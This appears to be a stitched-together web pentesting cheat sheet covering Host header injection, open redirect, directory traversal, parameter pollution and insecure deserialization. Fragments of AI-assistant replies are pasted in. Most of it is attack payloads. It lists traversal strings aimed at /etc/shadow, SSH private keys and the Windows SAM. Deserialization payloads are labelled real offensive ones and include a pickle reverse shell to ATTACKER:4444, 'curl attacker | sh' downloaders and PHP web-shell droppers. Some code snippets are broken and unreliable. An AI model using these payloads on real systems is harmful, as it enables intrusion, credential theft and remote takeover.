   If SSRF is successful, log internal endpoints/data accessed via your Host payload.

---

### 🛠️ **Proxy-Aware Tools for Testing**

To simulate or bypass corporate proxies, use these tools:

| Tool | Description |
|------|-------------|
| [Burp Suite](https://portswigger.net/burp) | Use Repeater and Intruder to test header combinations. |
| [Headi](https://www.blackhatethicalhacking.com/tools/headi/) | Automates header injection with proxy-aware payloads. |
| [HostHeaderScanner](https://github.com/inpentest/HostHeaderScanner) | Detects Host Header Injection and SSRF via proxy headers. |
| [Param Miner (Burp Extension)](https://portswigger.net/bappstore/9f3c3b7b9e4f4e3e9c3d3e3b9f3c3b7b) | Finds hidden headers and ambiguous parsing behavior. |

---

### 🧪 **Advanced Proxy Bypass Tricks**

- **Use internal IPs**: `Host: 127.0.0.1` or `Host: 192.168.0.1`
- **Subdomain spoofing**: `Host: attacker.vulnerable.com`
- **Header fuzzing**: Try variations like `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`
- **Cache poisoning**: Inject headers that affect CDN behavior (e.g., `Vary`, `X-Forwarded-Proto`)

---

## 🔓 4. **Bypassing Access Controls via Host Header**

### 🎯 Objective:

Bypass authentication or domain-based restrictions by modifying the Host.

### ✅ Steps:

1. **Try to access a restricted resource**
   Normally responds with 401 or redirect.

2. **Modify Host to a whitelisted one**
   Try values like:

   ```
   Host: internal-service
   Host: localhost
   ```

3. **Observe the result**
   If the app wrongly trusts this Host, you may gain access.

4. **Combine with X-Forwarded-Host or X-Original-URL headers**

   ```
   Host: attacker.com  
   X-Forwarded-Host: internal
   ```

5. **Check behavior**
   Did it skip authentication? Did it trust internal access?

---

---
# 4. URL Redirection (Used as a Phishing Attack) or Open Redirection

## HTTP Status Code: 3xx, 200

### Common Parameters List:
```
dest,redirect,?,something is redirect to page
uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,validate,domain,callback,return,page,feed,host,port,next,data,reference,site,html,u=
```

### Payload Examples:
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

### Approach:
1. **URL Redirection on Path Fragments:**
   ```
   example: any.com/payloads
   any.com/bing.com
   any.com//bing.com
   any.com//bing.com/%2e%2e
   ```
   Use the payload to attempt a brute-force attack.

2. **Sort the Parameters Returning a 200 Response:**
   ```
   GET /url=https://bing.com/
   ```

### Bypassing Techniques:
- Using a whitelisted domain or keyword: `https://www.whitelisted.com/evil.com` redirects to `evil.com`
- Using `//` to bypass `http` blacklisted keyword: `//google.com`
- Using `https:` to bypass `//` blacklisted keyword: `https:google.com`
- Using `%E3%80%82` to bypass `.` blacklisted character: `//google%E3%80%82com`
- Using parameter pollution: `?next=whitelisted.com&next=google.com`
- Using `@` character: `http://www.theirsite.com@yoursite.com/`

**More payloads and techniques:** [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md 
---
# Directory Traversal

* [Methodology](#methodology)
    * [URL Encoding](#url-encoding)
    * [Double URL Encoding](#double-url-encoding)
    * [Unicode Encoding](#unicode-encoding)
    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
    * [Mangled Path](#mangled-path)
    * [NULL Bytes](#null-bytes)
    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
* [Exploit](#exploit)
    * [UNC Share](#unc-share)
    * [ASPNET Cookieless](#asp-net-cookieless)
    * [IIS Short Name](#iis-short-name)
    * [Java URL Protocol](#java-url-protocol)
* [Path Traversal](#path-traversal)
    * [Linux Files](#linux-files)
    * [Windows Files](#windows-files)

## Tools

* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer

    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```
## Methodology

We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### URL Encoding

| Character | Encoded |
| --- | -------- |
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |

**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### Double URL Encoding

Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.

| Character | Encoded |
| --- | -------- |
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |

**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### Unicode Encoding

| Character | Encoded |
| --- | -------- |
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |

**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### Overlong UTF-8 Unicode Encoding

The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.

| Character | Encoded |
| --- | -------- |
| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` | `%c0%5c`, `%c0%80%5c` |

### Mangled Path

Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.

```powershell
..././
...\.\
```

**Example:**: Mirasys DVMS Workstation <=5.12.6

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

### NULL Bytes

A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.

**Example:** Homematic CCU3 CVE-2019-9726

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### Reverse Proxy URL Implementation

Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.

```powershell
..;/
```

**Example**: Pascom Cloud Phone System CVE-2021-45967

A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```
### UNC Share

A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.

An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.

```powershell
\\localhost\c$\windows\win.ini
```

Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.

### IIS Short Name

The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.

* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

    ```ps1
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
    ```

* [bitquark/shortscan](https://github.com/bitquark/shortscan)

    ```ps1
    shortscan http://example.org/
    ```
### Windows Files

The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.

```powershell
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)

```powershell
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```
## 📁 Directory Traversal — Test Cases & Payloads
```text
file, filename, filepath, path, dir, directory, folder, page, doc, document, download, include, resource, view, template, theme, skin, pdf, img, image, icon, style, css, js, script, asset, config, config_file, config_path, log, log_file, log_path, backup, restore, target, location, lang, language, locale, base, basepath, root, home, url, uri, endpoint, slug
```
Let me know if you'd like this exported into a Burp Intruder wordlist, YAML config, or integrated into your passive scanner logic. I can also help you build a matcher that auto-switches encoding variants (`../`, `%2e%2e%2f`, etc.) for each parameter. Ready to modularize it 🔧📁
---

### **1. Basic Traversal Payloads**
```text
../, ..\, ..//, ..\\, .../, ...\\
../../../../../../etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
```

---

### **2. Encoded Variants**
```text
%2e%2e%2f, %252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%u002e%u002e%u2215
```

---

### **3. Bypass Techniques**
```text
..././, ...\\.\\, ..;/, ..%00/
\\\\localhost\\c$\\windows\\win.ini
////////../../../../etc/passwd
```

---

### **4. Target Files (Linux)**
```text
/etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /proc/version
/home/$USER/.bash_history, /home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
```

---

### **5. Target Files (Windows)**
```text
c:/windows/system32/license.rtf
c:/boot.ini, c:/inetpub/wwwroot/web.config
c:/sysprep/sysprep.xml, c:/system32/inetsrv/metabase.xml
```

---

### **6. Log File Injection Targets**
```text
/var/log/apache/access.log
/var/log/nginx/error.log
/usr/local/apache2/log/error_log
```

---

### **7. Common Parameters to Fuzz**
```text
file, filename, path, filepath, page, doc, download, include, template, view, url, resource, dir, folder, asset
```

---

### **8. HTTP Injection Points**
- **Query**: `GET /?file=../../etc/passwd`
- **Path**: `GET /../../etc/passwd`
- **Header**: `X-File: ../../etc/passwd`
- **Cookie**: `file=../../etc/passwd`
- **JSON**:
  ```json
  { "file": "../../etc/passwd" }
  ```
# **✅ Directory Traversal Attack – Complete Test Case (with Bypass Cases)**

1 Basic Path Traversal (“../” sequences)

2 Encoded Path Traversal (URL, Unicode, UTF-8)

3 Double-Encoded Traversal

4 Null Byte Injection (Legacy PHP/Java)

5 Absolute Path Injection

6 Filter Bypass using Nested Traversal

7 Path Normalization Vulnerability

8 Directory Traversal via File Upload

9 Traversal inside ZIP, TAR extraction

10 Traversal in API parameters (/download?file=)

11 Log File / Sensitive File Exposure

12 OS Command File Read Chaining

13 Traversal via Path Overwrite (%2e%2e/)

14 Mixed Encoding Traversal

15 SSRF → Traversal on server-side FS

---

# **2. Sample Payloads (Core Attack Payloads)**

*(Clean structure — normal payload list)*

```
2.1 Basic Traversal
../../../../etc/passwd
```

```
2.2 Windows Traversal
..\..\..\windows\win.ini
```

```
2.3 Absolute Path Injection
/etc/shadow
```

```
2.4 Traversal Using Null Byte
../../etc/passwd%00.jpg
```

```
2.5 API Traversal Attempt
/download?file=../../../../etc/hosts
```

```
2.6 Traversal via Image Parameter
?path=../../uploads/
```

```
2.7 Within ZIP/TAR Extraction
../../../../var/www/html/shell.php
```

```
2.8 Directory Enumeration
../../../../
```

---

# **3. Sample Payloads (Updated With Real Payloads for Learning)**

*(Actual offensive payloads widely used in real-world exploitation)*

```
3.1 Unix Sensitive File Read
../../../../../../etc/shadow
```

```
3.2 SSH Key Extraction
../../../../../home/user/.ssh/id_rsa
```

```
3.3 Apache Log Poisoning → RCE Chain
../../../../var/log/apache2/access.log
```

```
3.4 PHP Session Stealing
../../../../var/lib/php/sessions/sess_12345
```

```
3.5 Configuration File Leak
../../../../etc/mysql/my.cnf
```

```
3.6 Read Application Secrets
../../../../app/config/config.json
```

```
3.7 Windows SAM File Read
..\..\..\Windows\System32\config\SAM
```

```
3.8 Tomcat Credentials Read
../../../../conf/tomcat-users.xml
```

```
3.9 NGINX Passwords
../../../../etc/nginx/.htpasswd
```

```
3.10 Source Code Read
../../../../var/www/html/index.php
```

---

# **4. Bypass Techniques (Filter, Encoding, WAF, Normalization)**

*(Bypass payload list only)*

```
4.1 URL Encoded Traversal
..%2f..%2f..%2fetc%2fpasswd
```

```
4.2 Double URL Encoding
..%252f..%252fetc%252fpasswd
```

```
4.3 Mixed Encoding Technique
..%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

```
4.4 Unicode Bypass
..%c0%af..%c0%af..%c0%afetc/passwd
```

```
4.5 Hex Encoded Bypass
..%2e%2e%5cetc%5cpasswd
```

```
4.6 Overlong UTF-8 Bypass
..%c0%ae%c0%ae/
```

```
4.7 Path Injection Using Dot Trick
....//....//etc/passwd
```

```
4.8 Backslash Injection for Windows
..\\..\\..\\boot.ini
```

```
4.9 Filtering Bypass with Fake Folder Prefix
..%2f..%2fsub/../etc/passwd
```

```
4.10 Trailing Slash Normalization Bypass
../../../../etc/passwd/
```

---

# **5. Advanced Attack Chains (Real-World Exploitation)**

```
5.1 Directory Traversal → Log Poisoning → RCE
../../../../var/log/nginx/access.log
```

```
5.2 Directory Traversal → Read DB Credentials → DB Takeover
../../../../../var/www/app/.env
```

```
5.3 Directory Traversal → Config Read → Admin Password Leak
../../../../../config/admin.php
```

```
5.4 ZIP Slip (Unzip Traversal) → Webshell Deployment
../../../../var/www/html/shell.php
```

```
5.5 Path Traversal → LFI → RCE Chain
../../../../var/www/html/index.php?page=../../../../etc/passwd
```

```
5.6 Web Cache → Traversal → Credential Theft
../../../../../etc/apache2/.htpasswd
```

```
5.7 Traversal → Private SSH Key Leak → Full Server Access
../../../../home/appuser/.ssh/id_rsa
```
# HTTP Parameter Pollution

## Methodology

HTTP Parameter Pollution (HPP) is a web security vulnerability where an attacker injects multiple instances of the same HTTP parameter into a request. The server's behavior when processing duplicate parameters can vary, potentially leading to unexpected or exploitable behavior.

HPP can target two levels:

* Client-Side HPP: Exploits JavaScript code running on the client (browser).
* Server-Side HPP: Exploits how the server processes multiple parameters with the same name.

**Examples**:

```ps1
/app?debug=false&debug=true
/transfer?amount=1&amount=5000
```

# Headless Browser

> A headless browser is a web browser without a graphical user interface. It works just like a regular browser, such as Chrome or Firefox, by interpreting HTML, CSS, and JavaScript, but it does so in the background, without displaying any visuals.
> Headless browsers are primarily used for automated tasks, such as web scraping, testing, and running scripts. They are particularly useful in situations where a full-fledged browser is not needed, or where resources (like memory or CPU) are limited.

## Summary

* [Headless Commands](#headless-commands)
* [Local File Read](#local-file-read)
* [Debugging Port](#debugging-port)
* [Network](#network)
    * [Port Scanning](#port-scanning)
    * [DNS Rebinding](#dns-rebinding)
* [References](#references)

## Headless Commands

Example of headless browsers commands:

* Google Chrome

    ```ps1
    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
    ```

* Mozilla Firefox

    ```ps1
    firefox --screenshot https://www.google.com
    ```

* Microsoft Edge

    ```ps1
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
    ```
---
# HTTP Hidden Parameters

> Web applications often have hidden or undocumented parameters that are not exposed in the user interface. Fuzzing can help discover these parameters, which might be vulnerable to various attacks.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Bruteforce Parameters](#bruteforce-parameters)
    * [Old Parameters](#old-parameters)
* [References](#references)

## Tools

* [PortSwigger/param-miner](https://github.com/PortSwigger/param-miner) - Burp extension to identify hidden, unlinked parameters.
* [s0md3v/Arjun](https://github.com/s0md3v/Arjun) - HTTP parameter discovery suite
* [Sh1Yo/x8](https://github.com/Sh1Yo/x8) - Hidden parameters discovery suite
* [tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) - Fetch all the URLs that the Wayback Machine knows about for a domain
* [devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider) - Mining URLs from dark corners of Web Archives for bug hunting/fuzzing/further probing

## Methodology

### Bruteforce Parameters

* Use wordlists of common parameters and send them, look for unexpected behavior from the backend.

    ```ps1
    x8 -u "https://example.com/" -w <wordlist>
    x8 -u "https://example.com/" -X POST -w <wordlist>
    ```

Wordlist examples:

* [Arjun/large.txt](https://github.com/s0md3v/Arjun/blob/master/arjun/db/large.txt)
* [Arjun/medium.txt](https://github.com/s0md3v/Arjun/blob/master/arjun/db/medium.txt)
* [Arjun/small.txt](https://github.com/s0md3v/Arjun/blob/master/arjun/db/small.txt)
* [samlists/sam-cc-parameters-lowercase-all.txt](https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-lowercase-all.txt)
* [samlists/sam-cc-parameters-mixedcase-all.txt](https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-mixedcase-all.txt)
----
# Insecure Deserialization

* [Deserialization Identifier](#deserialization-identifier)
* [POP Gadgets](#pop-gadgets)
* [Labs](#labs)
* [References](#references)

## Deserialization Identifier

Check the following sub-sections, located in other chapters :

* [Java deserialization : ysoserial, ...](Java.md)
* [PHP (Object injection) : phpggc, ...](PHP.md)
* [Ruby : universal rce gadget, ...](Ruby.md)
* [Python : pickle, PyYAML, ...](Python.md)
* [.NET : ysoserial.net, ...](DotNET.md)

| Object Type     | Header (Hex) | Header (Base64) |
|-----------------|--------------|-----------------|
| Java Serialized | AC ED        | rO              |
| .NET ViewState  | FF 01        | /w              |
| Python Pickle   | 80 04 95     | gASV            |
| PHP Serialized  | 4F 3A        | Tz              |

Absolutely, Anvesh. Based on your repo structure and the methodology outlined in your pilot testing doc, here’s a comprehensive, GitHub-ready Markdown checklist covering **insecure deserialization** across common formats and platforms:

---

## 🧨 Insecure Deserialization – Pentest Checklist

### 🔍 Identification Criteria
- ✅ Application accepts serialized data (JSON, XML, binary, etc.)
- ✅ Deserialization occurs without integrity checks or class whitelisting
- ✅ Stack traces or error messages reveal deserialization libraries
- ✅ Presence of known serialization formats (e.g., `rO0AB`, `O:`, `a:`, `b'aced'`)

---

### 🧪 Fuzzable Entry Points

```text
session, token, data, payload, object, blob, state, config, user, profile, settings, preferences, export, import, backup, restore, message, request, response, cache, cookie
```

---

### 🛠️ Tooling Suggestions

| Tool | Purpose |
|------|---------|
| [ysoserial](https://github.com/frohoff/ysoserial) | Java gadget chain generation |
| [PHPGGC](https://github.com/ambionics/phpggc) | PHP gadget chains |
| [SerialKiller](https://github.com/NetSPI/SerialKiller) | .NET deserialization testing |
| [Burp Deserialization Scanner](https://github.com/PortSwigger/deserialization-scanner) | Passive detection |
| [Hackvertor](https://portswigger.net/bappstore/3e8c6e0d7f4a4e2c9e6b8f5b4e8c6e0d) | Encoding/decoding payloads |

---

**1. Blind Callback via Deserialization**  
Trigger DNS/HTTP exfiltration to confirm deserialization execution.

```java
// Java (ysoserial - CommonsCollections1)
Payload: http://oast.test/ping

// PHP
O:8:"Exploit":1:{s:4:"ping";s:33:"http://oast.test/ping.jpg";}

// JSON (Jackson)
{"@type":"java.net.URL","val":"http://oast.test/callback"}
```

---

**2. File Write via Gadget Chain**  
Write arbitrary file to disk during deserialization.

```java
// ysoserial - FileOutputStream chain
Creates: /tmp/proof.txt

// PHPGGC - Monolog/RCE1
Writes: /tmp/success.txt with attacker-controlled content
```

---

**3. Remote Command Execution**  
Execute system commands via deserialization gadgets.

```java
// ysoserial - ProcessBuilder
Payload: `whoami`

// PHPGGC - SwiftMailer/Fwrite
Payload: `uname -a`

// JSON (Spring Boot)
{"@type":"java.lang.ProcessBuilder","command":["id"]}
```

---

**4. Time-Based Blind Execution**  
Use sleep/delay to confirm code execution.

```java
// Java
${T(java.lang.Thread).sleep(5000)}

// PHP
O:8:"Exploit":1:{s:4:"cmd";s:5:"sleep";}

// Python (Pickle)
pickle.loads with time.sleep(5)
```

---

**5. Logic Bypass via Type Confusion**  
Replace expected object type to bypass validation.

```php
// Replace expected `User` with `stdClass`
O:8:"stdClass":1:{...}

// JSON
{"@type":"com.fasterxml.jackson.databind.node.ObjectNode","x":1}
```

---

**6. Malformed Blob Crash**  
Trigger parser exceptions with corrupted payloads.

```java
// Truncated blob
Payload: `rO0A....`

// PHP
O:8:"Broken":3:{s:4:"x";i:2; => malformed structure
```

---

**7. Unsafe XML Deserialization**  
Inject objects via XML parsers that support class loading.

```xml
<object class="java.lang.Runtime">
  <method>getRuntime().exec("calc.exe")</method>
</object>
```

---

**8. Python Pickle RCE**  
Exploit unsafe `pickle.loads()` usage.

```python
import pickle, os
payload = pickle.dumps(os.system('id'))
```

---

**9. Ruby Marshal RCE**  
Exploit unsafe `Marshal.load()` usage.

```ruby
Marshal.dump(`id`)
```

---

**10. Cache Poisoning via Deserialization**  
Inject serialized blob into Redis/Memcached.

```java
// Poisoned object stored under known key
Retrieval triggers deserialization and execution
```

---

**11. Cookie-Based Deserialization**  
Embed serialized object in session or JWT cookie.

```php
// Encoded session cookie
O:8:"Exploit":1:{s:4:"role";s:5:"admin";}
```
# **✅ Insecure Deserialization – Complete Test Case (with Bypass Cases)**

1 Remote Code Execution via Object Deserialization

2 Arbitrary Object Injection

3 ClassLoader Instantiation Abuse

4 Magic Method Exploitation (__wakeup / __destruct / __toString)

5 PHP Serialization Attack (PHP Object Injection)

6 Java Deserialization (Commons-Collections Gadget)

7 Python Pickle RCE

8 .NET BinaryFormatter RCE

9 Node.js Serialized Payload Injection

10 Bypass of Integrity Checks (HMAC, MAC, Signing)
---

# **2. Sample Payloads (Core Attack Payloads)**

*(Normal structured payload list)*

```
2.1 PHP Serialized Object Injection
O:8:"Example":1:{s:4:"cmd";s:2:"id";}
```

```
2.2 Java Serialized Object (Commons Collections)
(ac ed 00 05 ... binary payload ...)
```

```
2.3 Python Pickle Malicious Payload
cos
system
(S'id')
```

```
2.4 Node.js Serialized Object Attack
{"rce":{"__proto__":{"exec":"node -e '...'"} }}
```

```
2.5 Ruby Marshal RCE
"\x04\bo:@ExploitClass\t:\n@commandI\"id"
```

```
2.6 Signed Serialization Token Tampering
{"token":"base64(serialized_object)"}
```

```
2.7 Tampering Serialized Cookies
Set-Cookie: session=serialized_data_here
```

```
2.8 JavaScript Object Deserialization (Unsafe JSON.parse)
{"__proto__":{"isAdmin":true}}
```

```
2.9 Config File Deserialization Attack
settings=base64(serialized_object)
```

```
2.10 Unsafe BinaryFormatter (.NET) Payload
(binary stream containing prebuilt gadget)
```

---

# **3. Sample Payloads (Updated With Real Offensive Payloads)**

*(Real attack payloads used in ransomware, shell drops, and privilege escalation)*

```
3.1 PHP POP Chain → RCE
O:8:"Exploit":2:{s:4:"file";s:12:"/tmp/shell";s:4:"code";s:13:"<?php eval($_GET['x']);?>";}
```

```
3.2 PHP __destruct File Write → Web Shell Dropper
O:6:"Logger":1:{s:4:"log";s:40:"<?php system($_GET['cmd']); ?>";}
```

```
3.3 Java Commons-Collections 7 RCE Gadget
(base64 Gadgets)
rO0ABXNyABF...
```

```
3.4 Python Pickle Reverse Shell
cos
system
(S"bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
tR.
```

```
3.5 Ruby Marshal Payload (Metasploit)
\x04\bo:@Exploit\x06:\f@payloadI\"curl attacker/pwn|sh"
```

```
3.6 .NET BinaryFormatter RCE Gadget (ysoserial.net)
AAEAAAD/////AQAAAAAAAAAEAQAAAC...
```

```
3.7 Node.js Express-session Poisoning
{"cookie":{"originalMaxAge":null,"expires":"-1"},"__proto__":{"outputFunction":"require('child_process').exec('curl http://attacker/p.sh | sh')"}}
```

```
3.8 YAML Deserialization → RCE
!!python/object/apply:os.system ["id"]
```

```
3.9 Perl Storable Deserialize Command Execution
$VAR1 = bless( { cmd => 'id' }, 'Exploit' );
```

```
3.10 Golang gob Decoder Exploit
(binary gob-encoded payload crafted to instantiate interfaces)
```

---

# **4. Bypass Techniques (WAF, Signing, Filters, Validators)**

*(Same style as previous attack formats)*

```
4.1 Base64 Double Encoding
base64(base64(serialized payload))
```

```
4.2 JSON Wrapping Bypass
{"data":"serialized_here"}
```

```
4.3 Magic-Bytes Obfuscation
\x00\x01\x02O:3:"ABC":1:{...}
```

```
4.4 Signature Stripping (Weak HMAC)
token = base64(payload) + "." + weak_signature
```

```
4.5 PHP Serialization Splitting
O:3:"A":1:{s:1:"x";s:3:"abc";}
O:+1:"B":1:{s:1:"x";s:3:"cmd";}
```

```
4.6 Whitespace / Newline Injection
O:6:"Class":
1
:{
...
}
```

```
4.7 Unicode Obfuscation
O\u003a6\u003a\"Class\"...
```

```
4.8 Chunked Transfer Encoding (WAF Bypass)
Transfer-Encoding: chunked
(serialized payload split into chunks)
```

```
4.9 Cookie Prefix Bypass
__Host-session -> session
```

```
4.10 Compression Bypass (gzip/base64)
H4sIAAAAA (GZIPed payload)
```

---

# **5. Advanced Attack Chains (Real-World Exploitation)**

```
5.1 Insecure Deserialization → Remote Code Execution
Upload serialized object → triggers magic methods → executes system("id")
```

```
5.2 Signed Token Bypass → Account Takeover
Manipulate HMAC-signed session → user=admin
```

```
5.3 Python Pickle in ML API → Server Takeover
{"model": base64(pickle_rce_payload)}
```

```
5.4 Java Deserialization → JNDI → LDAP RCE
Serialized object calls remote lookup → loads attacker class
```

```
5.5 Node.js Deserialization → Prototype Pollution → Eval RCE
{"__proto__":{"outputFunction":"require('child_process').exec('id')"}}
```

```
5.6 Ruby Marshal → RCE on Rails apps
session=Marshal.dump(exploit_object)
```

```
5.7 YAML → RCE Chain
!!python/object/new:subprocess.Popen ["curl attacker | sh"]
```

## POP Gadgets

> A POP (Property Oriented Programming) gadget is a piece of code implemented by an application's class, that can be called during the deserialization process.

POP gadgets characteristics:

* Can be serialized
* Has public/accessible properties
* Implements specific vulnerable methods
* Has access to other "callable" classes

## Labs

* [PortSwigger - Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
* [PortSwigger - Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
* [PortSwigger - Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
* [PortSwigger - Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
* [PortSwigger - Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
* [PortSwigger - Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
* [PortSwigger - Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
* [PortSwigger - Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)
* [PortSwigger - Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
* [PortSwigger - Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)
* [NickstaDB - DeserLab](https://github.com/NickstaDB/DeserLab)

----
### Parameter Pollution Table

When ?par1=a&par1=b

| Technology                                      | Parsing Result           | outcome (par1=) |
| ----------------------------------------------- | ------------------------ | --------------- |
| ASP.NET/IIS                                     | All occurrences          | a,b             |
| ASP/IIS                                         | All occurrences          | a,b             |
| Golang net/http - `r.URL.Query().Get("param")`  | First occurrence         | a               |
| Golang net/http - `r.URL.Query()["param"]`      | All occurrences in array | ['a','b']       |
| IBM HTTP Server                                 | First occurrence         | a               |
| IBM Lotus Domino                                | First occurrence         | a               |
| JSP,Servlet/Tomcat                              | First occurrence         | a               |
| mod_wsgi (Python)/Apache                        | First occurrence         | a               |
| Nodejs                                          | All occurrences          | a,b             |
| Perl CGI/Apache                                 | First occurrence         | a               |
| Perl CGI/Apache                                 | First occurrence         | a               |
| PHP/Apache                                      | Last occurrence          | b               |
| PHP/Zues                                        | Last occurrence          | b               |
| Python Django                                   | Last occurrence          | b               |
| Python Flask                                    | First occurrence         | a               |
| Python/Zope                                     | All occurrences in array | ['a','b']       |
